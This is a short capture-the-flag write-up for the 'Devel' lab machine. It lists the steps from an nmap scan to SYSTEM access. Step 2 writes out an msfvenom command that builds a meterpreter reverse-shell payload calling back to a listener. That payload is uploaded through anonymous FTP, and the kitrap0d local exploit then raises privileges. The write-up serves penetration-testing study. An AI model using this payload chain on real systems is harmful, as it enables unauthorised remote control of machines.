# CTF Writeup: Devel

---

- Step 1: added <target_ip> to /etc/hosts and ran nmap scan --> 21 & 80 are open
- Step 2: made msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.14.187 LPORT=4444 -f aspx > shell.aspx 
- Step 3: made msfconsole -q --> use multi/handler --> configured it and ran it.
- Step 4: logged into ftp anonymously and made put ./shell.aspx --> typed in target_ip/shell.aspx in webbrowser
- Step 5: gained rce, but cant view any files --> privs to low --> STRG + Z to background shell
- Step 6: ran local_exploit_suggester --> tested multiple exploits --> windows/local/ms10_015_kitrap0d worked.
- Step 7: gained RCE as NT AUTHORITY/SYSTEM & retrieved user.txt & root.txt flags.

---

## Key Learnings

- Increased Enumeration Methodology
- Increased Exploitation Knowledge
- Increased FTP Knowledge
- Slightly increased metasploit knowledge
